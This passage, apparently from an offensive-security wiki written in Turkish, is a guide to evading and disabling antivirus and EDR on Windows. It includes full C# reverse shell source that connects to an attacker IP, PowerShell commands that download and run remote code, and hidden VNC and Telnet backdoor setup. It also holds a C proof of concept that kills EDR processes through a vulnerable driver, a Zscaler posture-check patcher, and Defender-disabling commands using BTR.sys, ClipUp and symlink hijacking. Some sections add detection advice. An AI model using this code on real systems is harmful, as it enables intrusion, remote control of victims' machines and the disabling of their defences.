Aynı işi yapan bir diğer araç [**avred**](https://github.com/dobin/avred); bu hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık bir web arayüzüyle sunuyor.

### **Telnet Server**

Windows 10'a kadar tüm Windows sürümleri, yönetici olarak yükleyebileceğiniz bir **Telnet Server** ile geliyordu. Şunu çalıştırmanız yeterliydi:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet portunu değiştir** (stealth) ve güvenlik duvarını devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads dosyalarını istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanında bir parola belirleyin
- _View-Only Password_ alanında bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın** içine taşıyın

#### **Reverse connection**

**Saldırgan**, reverse **VNC connection** yakalamaya **hazır** olması için `vncviewer.exe -listen 5900` binary dosyasını **kendi host'unda** çalıştırmalıdır. Ardından, **kurbanın** içinde: `winvnc.exe -run` komutuyla winvnc daemon'unu başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için yapmamanız gereken birkaç şey var

- `winvnc` zaten çalışıyorsa başlatmayın; aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın; aksi takdirde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi `msfconsole -r file.rc` ile **listener'ı başlatın** ve **xml payload'ı** şu şekilde **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Güncel Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Bununla birlikte kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanarak

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Savunmasız Sürücünü Getir (BYOVD) – Kernel Alanından AV/EDR'yi Sonlandırma

Storm-2603, fidye yazılımını bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç **kendi savunmasız ama *imzalı* sürücüsünü** beraberinde getiriyor ve bunu, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanıyor.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys`, ancak ikili dosya, Antiy Labs’ın “System In-Depth Analysis Toolkit” aracındaki yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır driver'ı **kernel service** olarak kaydeder, ikinci satır ise onu başlatarak `\\.\ServiceMouse`'un user land'den erişilebilir olmasını sağlar.
3. **Driver'ın sunduğu IOCTL'ler**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile herhangi bir process'i sonlandırma (Defender/EDR servislerini kapatmak için kullanılır) |
   | `0x990000D0` | Diskteki herhangi bir dosyayı silme |
   | `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *korumalı* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerine müdahale edebilir.

Tespit / Azaltma
• Microsoft’un vulnerable-driver block list’ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows, `AToolsKrnl64.sys` dosyasının yüklenmesini reddeder.
• Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list’te bulunmadığında uyarı verin.
• Özel device object’lere açılan user-mode handle’ları ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Zscaler Client Connector Posture Checks Denetimlerini Diskteki Binary’leri Patch’leyerek Atlama

Zscaler’ın **Client Connector** uygulaması, device-posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye güvenir. İki zayıf tasarım tercihi, tam bir bypass’ı mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC endpoint’leri yalnızca bağlanan executable’ın **Zscaler tarafından imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Diskteki dört imzalı binary patch’lenerek** her iki mekanizma da etkisiz hâle getirilebilir:

| Binary | Patch’lenen özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her denetim uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust` için dolaylı çağrı | NOP’lanır ⇒ herhangi bir süreç (imzasız olanlar bile) RPC pipe’larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tüneldeki integrity denetimleri | Kısa devre edilir |

Minimal patcher alıntısı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve servis yığınını yeniden başlattıktan sonra:

* **Tüm** duruş kontrolleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar adlandırılmış kanal RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana bilgisayar, Zscaler politikalarında tanımlanan iç ağa kısıtlamasız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafındaki güven kararlarının ve basit imza kontrollerinin birkaç byte patch'iyle nasıl aşılabileceğini gösterir.

## Microsoft Defender `BTR.sys` güvenilir işlevselliğinin kötüye kullanılması

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye karşı yararlı bir örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir düzeltme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde edildikten sonra operatör, özel düzeltme işlemini taklit ederek tasarlanmış Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ele geçirme sonrası AV/EDR etkisizleştirme ilkelidir**; ayrıca sürücü, dikkat çeken bir üçüncü taraf sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek kullanımlık sürücünün hazırlanması

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer şekilde adlandırılmış bir kernel service kaydeder. `DriverEntry`, servisin `Args` değerini okur, belirtilen NTFS ADS'yi açar, eylem listesinin şifresini çözer ve doğrular, geri bildirim yazar; başarılı yürütmenin ardından sürücü bellekte kalmak yerine kaldırılabilsin diye `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür. Sahte bir servis aşağıdaki karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream'i bir RC4 ile şifrelenmiş blob içerir. İncelenen build'ler sabit 256 baytlık bir anahtarı tekrar kullanır; bu nedenle şifreleme bir yetkilendirme sınırı değildir. Geçerli bir plaintext, 24 baytlık bir global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC'si ve payload'dan türetilen bir transaction ID) ile başlar; ardından null ile sonlandırılmış bir UTF-16 feedback path'i ve istenen sayıda item gelir. Her item, 16 baytlık bir header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ve **tam olarak dört NUL baytıyla** biten, action'a özgü verilerden oluşur. Her header/data bölgesi, CRC-32 polinomu `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **final XOR olmadan** (`~CRC32`) bağımsız olarak kontrol edilir; her bölge için CRC durumu sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen action ID'leri, bu kernel primitive'lerini açığa çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli dosyalar dahil bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Dosyayı saldırganın seçtiği korumalı bir path'e taşır; boş bir destination silme işlemi anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'ini özyinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'sunu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value'sunu oluşturur/günceller ve eksik key path'lerini oluşturur |

Action 5 ve 6 için, wire format'taki key/value ayıracı **art arda gelen iki ters eğik çizgidir**; standart biçimde yazılmış bir path doğru şekilde bölünmez. Feedback file çoğunlukla isteği yansıtır, ancak her item'ın ilk dört veri baytı, sonuçta oluşan `NTSTATUS` değerine dönüşür. Önde gelen flags alanı olmayan action 1 ve 2'de BTR, bu status'a yer açmak için path'i ayrılmış son dört bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken boot penceresi

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI), zincirin tamamını uygular: `BTR.sys` dosyasını yerel Defender'dan çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, zincirlenmiş action'ları serialize eder/checksum hesaplar/şifreler, service registry key'ini doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar ya da `-trigger boot` için sürücüyü system-start olarak bırakır. Registry'yi doğrudan hazırlamak, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle service-install Event ID 7045 oluşturmaz. Boot-triggered artifact'ler daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, storage stack ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. `Start=1` ile yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak birçok system-start security driver ve user-mode EDR service henüz başlatılmamıştır. `WdFilter` gibi boot-start filtreleri zaten yüklenmiş olabilir; ancak BTR sonraki başlangıçtan önce bu filtrelerin binary dosyalarını veya service yapılandırmasını kaldırabilir ve SCM bunları başlatmadan önce service executable dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir transaction içinde çalışır. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i başa ekler: BTR bu log'u oluşturur, ardından kendi silme isteğini işler ve unload olmadan önce log'u kaldırır. Bu, kanıtı azaltırken geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi driver'ı ve her iki stream'i birlikte kaldırmayı sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft vulnerable-driver blocklist'i, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender lineage'ını rastgele bir launcher'dan ayırt ederken bu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR staging işlemlerinin tamamında görülür. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender normalde geri bildirimi `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altında tutar.
- **Sysmon 12/13 ve System 7045 yok:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` konumuna doğrudan yapılan oluşturma işlemlerini, eşleşen bir SCM kurulum olayı olmamasıyla korelasyonlayın.
- **Sysmon 6 -> 23:** Defender dışı bilinen bir lineage'dan BTR driver yüklenmesini, özellikle güvenlik binary dosyaları için, ardından gelen ve `System`/PID 4'e atfedilen dosya silme işlemleriyle korelasyonlayın.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızla oluşturulup silinmesi durumunda uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; `cmd.exe`, PowerShell veya bilinmeyen bir process tarafından bir güvenlik aracı driver'ı staging işlemine tabi tutuluyorsa, tek başına Microsoft imzası yeterli güvence değildir.

## LOLBIN'lerle AV/EDR'ye Müdahale Etmek İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma düzeyindeki process'lerin birbirine müdahale edebilmesini sağlayan bir signer/level hiyerarşisi uygular. Saldırı amaçlı kullanımda, PPL etkin bir binary'yi meşru şekilde başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, logging gibi zararsız bir işlevi AV/EDR tarafından kullanılan korumalı dizinlere karşı PPL destekli, kısıtlı bir yazma primitive'ine dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir process'in PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL uyumlu bir EKU ile imzalanmış olmalıdır.
- Process, şu flag'lerle CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler, oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına daha geniş bir giriş için ayrıca şuraya bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım örüntüsü:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikilisi `C:\Windows\System32\ClipUp.exe` kendisini başlatır ve çağıranın belirttiği yola bir günlük dosyası yazmak için parametre kabul eder.
- PPL process olarak başlatıldığında dosya yazma işlemi PPL desteğiyle gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yolları kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` komutunu çalıştırın.
- cmd'de kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (soyut)
1) PPL özellikli LOLBIN'i (ClipUp) bir başlatıcı (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korunan bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için ClipUp günlük yolu argümanını verin. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili normalde AV tarafından çalışırken açık/kilitli durumdaysa (ör. MsMpEng.exe), AV başlamadan önce yazma işlemini gerçekleştirmek için daha önce çalışacağı kesin olan bir otomatik başlatma hizmeti yükleyerek işlemi önyükleme sırasında planlayın. Önyükleme sıralamasını Process Monitor (önyükleme günlüğü) ile doğrulayın.
4) Yeniden başlatmada PPL destekli yazma işlemi, AV ikililerini kilitlemeden önce gerçekleşir; hedef dosyayı bozarak başlangıcını engeller.

Örnek çağrı (güvenlik için yollar gizlenmiş/kısaltılmış):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği yerleşim dışında kontrol edemezsiniz; bu primitive, içeriği hassas biçimde enjekte etmekten ziyade bozulmaya uygundur.
- Bir hizmeti yüklemek/başlatmak için yerel yönetici/SYSTEM yetkisi ve bir yeniden başlatma aralığı gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme sırasında çalıştırma, dosya kilitlerini önler.

Tespitler
- Özellikle standart dışı başlatıcılar tarafından başlatılan ve önyükleme civarında olağandışı bağımsız değişkenlerle çalışan `ClipUp.exe` süreçlerinin oluşturulması.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış ve Defender/AV'den sürekli önce başlayan yeni hizmetler. Defender başlatma hatalarından önceki hizmet oluşturma/değiştirme işlemlerini araştırın.
- Defender ikili dosyaları/Platform dizinlerinde dosya bütünlüğü izleme; korumalı süreç bayraklarına sahip süreçlerin beklenmedik dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı ikili dosyaların anormal PPL düzeyi kullanımını araştırın.

Azaltma
- WDAC/Code Integrity: PPL olarak çalışabilecek imzalı ikili dosyaları ve bunların hangi üst süreçlerden başlatılabileceğini kısıtlayın; meşru bağlamlar dışında ClipUp'ın çağrılmasını engelleyin.
- Hizmet hijyeni: Otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender kurcalama korumasının ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa, güvenlik araçlarının bulunduğu birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasörü Symlink Hijack ile Microsoft Defender'ı Kurcalama

Windows Defender, çalışacağı platformu şu dizinin altındaki alt klasörleri sıralayarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek sözlüksel sürüm dizesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer, ardından Defender hizmet süreçlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Önkoşullar
- Yerel Yönetici (Platform klasörü altında dizinler/symlink'ler oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (önyüklemede hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller; ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan sözlüksel olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Geçerli platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden, daha yüksek sürüm numaralı bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunun `C:\TMP\AV\` altında olduğunu ve hizmet yapılandırması/kayıt defterinin bu konumu yansıttığını görmelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın işlemlerinde kod çalıştırmak için Defender’ın uygulama dizininden yüklediği DLL’leri bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
